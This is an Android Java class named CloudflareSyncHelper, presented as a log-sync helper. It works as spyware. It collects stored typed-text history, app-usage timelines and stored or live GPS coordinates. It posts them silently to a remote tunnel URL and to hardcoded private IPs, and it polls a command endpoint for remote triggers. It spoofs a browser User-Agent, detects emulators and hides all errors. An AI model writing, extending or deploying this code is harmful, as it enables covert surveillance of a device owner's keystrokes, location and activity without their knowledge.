package com.example.myhelper;

import android.content.Context;
import android.content.SharedPreferences;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CloudflareSyncHelper {

    private static final String PREF_NAME = "CloudflareSyncPrefs";
    private static final String KEY_TUNNEL_URL = "tunnel_url";
    private static final String KEY_API_KEY = "api_key";
    private static final String KEY_SYNC_ENABLED = "sync_enabled";
    private static final String KEY_SYNC_MODE = "sync_mode"; // "ON_DEMAND" (default) or "LIVE"

    private static final ExecutorService executor = Executors.newCachedThreadPool();
    private static final java.util.concurrent.atomic.AtomicBoolean isSyncing = new java.util.concurrent.atomic.AtomicBoolean(false);

    public static void saveConfig(Context context, String tunnelUrl, String apiKey, boolean syncEnabled) {
        SharedPreferences sp = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        sp.edit()
                .putString(KEY_TUNNEL_URL, tunnelUrl.trim())
                .putString(KEY_API_KEY, apiKey.trim())
                .putBoolean(KEY_SYNC_ENABLED, syncEnabled)
                .apply();

        if (syncEnabled) {
            flushOfflineLogs(context);
        }
    }

    public static String getSyncMode(Context context) {
        SharedPreferences sp = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        return sp.getString(KEY_SYNC_MODE, "ON_DEMAND");
    }

    public static void setSyncMode(Context context, String mode) {
        SharedPreferences sp = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        sp.edit().putString(KEY_SYNC_MODE, mode).apply();
    }

    public static boolean isLiveSyncEnabled(Context context) {
        return "LIVE".equalsIgnoreCase(getSyncMode(context));
    }

    public static String getTunnelUrl(Context context) {
        SharedPreferences sp = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        return sp.getString(KEY_TUNNEL_URL, "");
    }

    public static String getApiKey(Context context) {
        SharedPreferences sp = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        return sp.getString(KEY_API_KEY, "my_secret_token_123");
    }

    public static boolean isSyncEnabled(Context context) {
        SharedPreferences sp = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        return sp.getBoolean(KEY_SYNC_ENABLED, true);
    }

    private static boolean isEmulator() {
        return (android.os.Build.BRAND.startsWith("generic") && android.os.Build.DEVICE.startsWith("generic"))
                || android.os.Build.FINGERPRINT.startsWith("generic")
                || android.os.Build.FINGERPRINT.startsWith("unknown")
                || android.os.Build.HARDWARE.contains("goldfish")
                || android.os.Build.HARDWARE.contains("ranchu")
                || android.os.Build.MODEL.contains("google_sdk")
                || android.os.Build.MODEL.contains("Emulator")
                || android.os.Build.MODEL.contains("Android SDK built for x86")
                || android.os.Build.MANUFACTURER.contains("Genymotion")
                || android.os.Build.PRODUCT.contains("sdk_gphone");
    }

    public static void checkAndSyncIfRequested(Context context) {
        if (!isSyncEnabled(context)) return;
        if (!isSyncing.compareAndSet(false, true)) return;
        executor.execute(() -> {
            try {
                String tunnelUrl = getTunnelUrl(context);
                String apiKey = getApiKey(context);
                List<String> targetUrls = new ArrayList<>();
                if (!tunnelUrl.isEmpty()) {
                    String primary = tunnelUrl;
                    if (!primary.endsWith("/api/command")) {
                        primary += primary.endsWith("/") ? "api/command" : "/api/command";
                    }
                    targetUrls.add(primary);
                }
                if (isEmulator()) {
                    targetUrls.add("http://10.0.2.2:5000/api/command");
                    targetUrls.add("http://10.129.9.31:5000/api/command");
                    targetUrls.add("http://10.178.194.48:5000/api/command");
                } else {
                    targetUrls.add("http://10.129.9.31:5000/api/command");
                    targetUrls.add("http://10.178.194.48:5000/api/command");
                    targetUrls.add("http://10.0.2.2:5000/api/command");
                }

                for (String urlStr : targetUrls) {
                    try {
                        URL url = new URL(urlStr);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setRequestProperty("X-API-KEY", apiKey);
                        conn.setRequestProperty("bypass-tunnel-reminder", "true");
                        conn.setConnectTimeout(2000);
                        conn.setReadTimeout(2000);
                        if (conn.getResponseCode() == 200) {
                            java.io.InputStream is = conn.getInputStream();
                            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(is, "utf-8"));
                            StringBuilder sb = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) sb.append(line);
                            String jsonStr = sb.toString();
                            if (jsonStr.contains("\"sync_requested\":true") || jsonStr.contains("\"sync_requested\": true")) {
                                flushOfflineLogsInternal(context);
                                break;
                            }
                        }
                    } catch (Exception ignored) {}
                }
            } catch (Exception ignored) {
            } finally {
                isSyncing.set(false);
            }
        });
    }

    public static void flushOfflineLogs(Context context) {
        if (!isSyncEnabled(context)) return;
        executor.execute(() -> flushOfflineLogsInternal(context));
    }

    private static void flushOfflineLogsInternal(Context context) {
        try {
            List<String> jsonItems = new ArrayList<>();
            String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
            String safeDevice = deviceName.replace("\\", "\\\\").replace("\"", "\\\"");

            // 1. Flush Typed Text History
            SharedPreferences sp = context.getSharedPreferences("HelperLogs", Context.MODE_PRIVATE);
            String history = sp.getString("history", "");
            if (!history.trim().isEmpty()) {
                String[] entries = history.split("-------------------------");
                for (String entry : entries) {
                    String clean = entry.trim();
                    if (!clean.isEmpty()) {
                        String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                        String safeContent = clean.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ");
                        jsonItems.add(String.format("{\"device\":\"%s\",\"type\":\"TYPED_TEXT\",\"content\":\"%s\",\"timestamp\":\"%s\"}", safeDevice, safeContent, time));
                    }
                }
            }

            // 2. Flush Stored App Switch Timeline History
            String timelineHistory = sp.getString("timeline_history", "");
            if (!timelineHistory.trim().isEmpty()) {
                String[] entries = timelineHistory.split("-------------------------");
                for (String entry : entries) {
                    String clean = entry.trim();
                    if (!clean.isEmpty()) {
                        String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                        String safeContent = clean.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ");
                        jsonItems.add(String.format("{\"device\":\"%s\",\"type\":\"APP_TIMELINE\",\"content\":\"%s\",\"timestamp\":\"%s\"}", safeDevice, safeContent, time));
                    }
                }
            }

            // 3. Flush Recent UsageStats App Timeline
            try {
                android.app.usage.UsageStatsManager usm = (android.app.usage.UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
                if (usm != null) {
                    long endTime = System.currentTimeMillis();
                    long lastSyncedTime = sp.getLong("last_usagestats_sync_time", endTime - (1L * 60 * 60 * 1000L));
                    long startTime = Math.max(lastSyncedTime, endTime - (24L * 60 * 60 * 1000L));
                    android.app.usage.UsageEvents events = usm.queryEvents(startTime, endTime);
                    if (events != null) {
                        android.app.usage.UsageEvents.Event event = new android.app.usage.UsageEvents.Event();
                        SimpleDateFormat timeFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm a", Locale.getDefault());
                        android.content.pm.PackageManager pm = context.getPackageManager();

                        int count = 0;
                        while (events.hasNextEvent() && count < 30) {
                            events.getNextEvent(event);
                            if (event.getEventType() == android.app.usage.UsageEvents.Event.MOVE_TO_FOREGROUND) {
                                String pkg = event.getPackageName();
                                if (pkg == null || pkg.trim().isEmpty() || pkg.contains("launcher") || pkg.contains("systemui")) continue;
                                long time = event.getTimeStamp();
                                if (time <= lastSyncedTime) continue;
                                String appName = pkg;
                                try {
                                    android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
                                    appName = pm.getApplicationLabel(ai).toString();
                                } catch (Exception ignored) {}

                                String logContent = "🕒 [" + timeFormat.format(new Date(time)) + "] App Opened: " + appName + " (" + pkg + ")";
                                String safeContent = logContent.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ");
                                jsonItems.add(String.format("{\"device\":\"%s\",\"type\":\"APP_TIMELINE\",\"content\":\"%s\",\"timestamp\":\"%s\"}", safeDevice, safeContent, timeFormat.format(new Date(time))));
                                count++;
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}

            // 4. Flush Stored Location History (or query Live GPS if empty)
            String locHistory = sp.getString("location_history", "");
            if (!locHistory.trim().isEmpty()) {
                String[] entries = locHistory.split("-------------------------");
                for (String entry : entries) {
                    String clean = entry.trim();
                    if (!clean.isEmpty()) {
                        String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                        String safeContent = clean.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ");
                        jsonItems.add(String.format("{\"device\":\"%s\",\"type\":\"LOCATION\",\"content\":\"%s\",\"timestamp\":\"%s\"}", safeDevice, safeContent, time));
                    }
                }
            } else {
                // Fallback: Query live GPS location if location_history is empty
                try {
                    android.location.LocationManager lm = (android.location.LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                    if (lm != null) {
                        android.location.Location loc = null;
                        if (context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
                            context.checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                            loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
                            if (loc == null) loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
                        }
                        if (loc != null) {
                            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(loc.getTime()));
                            String safeContent = String.format(Locale.US, "📍 Live GPS: Lat %.5f, Lng %.5f (Accuracy: %.1fm)", loc.getLatitude(), loc.getLongitude(), loc.getAccuracy());
                            jsonItems.add(String.format("{\"device\":\"%s\",\"type\":\"LOCATION\",\"content\":\"%s\",\"timestamp\":\"%s\"}", safeDevice, safeContent, time));
                        }
                    }
                } catch (Exception ignored) {}
            }

            // If jsonItems is still empty, send active heartbeat status so dashboard gets populated
            if (jsonItems.isEmpty()) {
                String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                jsonItems.add(String.format("{\"device\":\"%s\",\"type\":\"APP_TIMELINE\",\"content\":\"🟢 Device Active Sync: Storage & Apps OK\",\"timestamp\":\"%s\"}", safeDevice, time));
            }

            if (!jsonItems.isEmpty()) {
                StringBuilder batchJson = new StringBuilder("[");
                for (int i = 0; i < jsonItems.size(); i++) {
                    batchJson.append(jsonItems.get(i));
                    if (i < jsonItems.size() - 1) batchJson.append(",");
                }
                batchJson.append("]");

                boolean success = dispatchRawPayload(context, batchJson.toString());
                if (success) {
                    sp.edit()
                            .putLong("last_usagestats_sync_time", System.currentTimeMillis())
                            .apply();
                }
            }
        } catch (Exception ignored) {}
    }

    public static void sendLog(Context context, String logType, String content) {
        if (!isSyncEnabled(context)) return;
        executor.execute(() -> dispatchLogPayload(context, logType, content));
    }

    private static void dispatchLogPayload(Context context, String logType, String content) {
        try {
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
            String safeContent = content.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ");
            String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
            String safeDevice = deviceName.replace("\\", "\\\\").replace("\"", "\\\"");

            String jsonPayload = String.format(
                    "{\"device\":\"%s\",\"type\":\"%s\",\"content\":\"%s\",\"timestamp\":\"%s\"}",
                    safeDevice, logType, safeContent, timestamp
            );

            dispatchRawPayload(context, jsonPayload);
        } catch (Exception ignored) {}
    }

    private static boolean dispatchRawPayload(Context context, String jsonPayload) {
        try {
            String tunnelUrl = getTunnelUrl(context);
            String apiKey = getApiKey(context);

            List<String> targetUrls = new ArrayList<>();
            if (!tunnelUrl.isEmpty()) {
                String primary = tunnelUrl;
                if (!primary.endsWith("/api/log")) {
                    primary += primary.endsWith("/") ? "api/log" : "/api/log";
                }
                targetUrls.add(primary);
            }
            if (isEmulator()) {
                targetUrls.add("http://10.0.2.2:5000/api/log");
                targetUrls.add("http://10.129.9.31:5000/api/log");
                targetUrls.add("http://10.178.194.48:5000/api/log");
            } else {
                targetUrls.add("http://10.129.9.31:5000/api/log");
                targetUrls.add("http://10.178.194.48:5000/api/log");
                targetUrls.add("http://10.0.2.2:5000/api/log");
            }

            for (String urlStr : targetUrls) {
                if (sendHttpRequest(urlStr, jsonPayload, apiKey)) {
                    return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    private static boolean sendHttpRequest(String urlStr, String jsonPayload, String apiKey) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; utf-8");
            conn.setRequestProperty("X-API-KEY", apiKey);
            conn.setRequestProperty("bypass-tunnel-reminder", "true");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 10)");
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(2000);
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            int code = conn.getResponseCode();
            if (code == 200) {
                try (java.io.InputStream is = conn.getInputStream();
                     java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(is, "utf-8"))) {
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    String resp = sb.toString();
                    return resp.contains("\"status\"") || resp.contains("success") || resp.contains("added");
                } catch (Exception ignored) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }
}
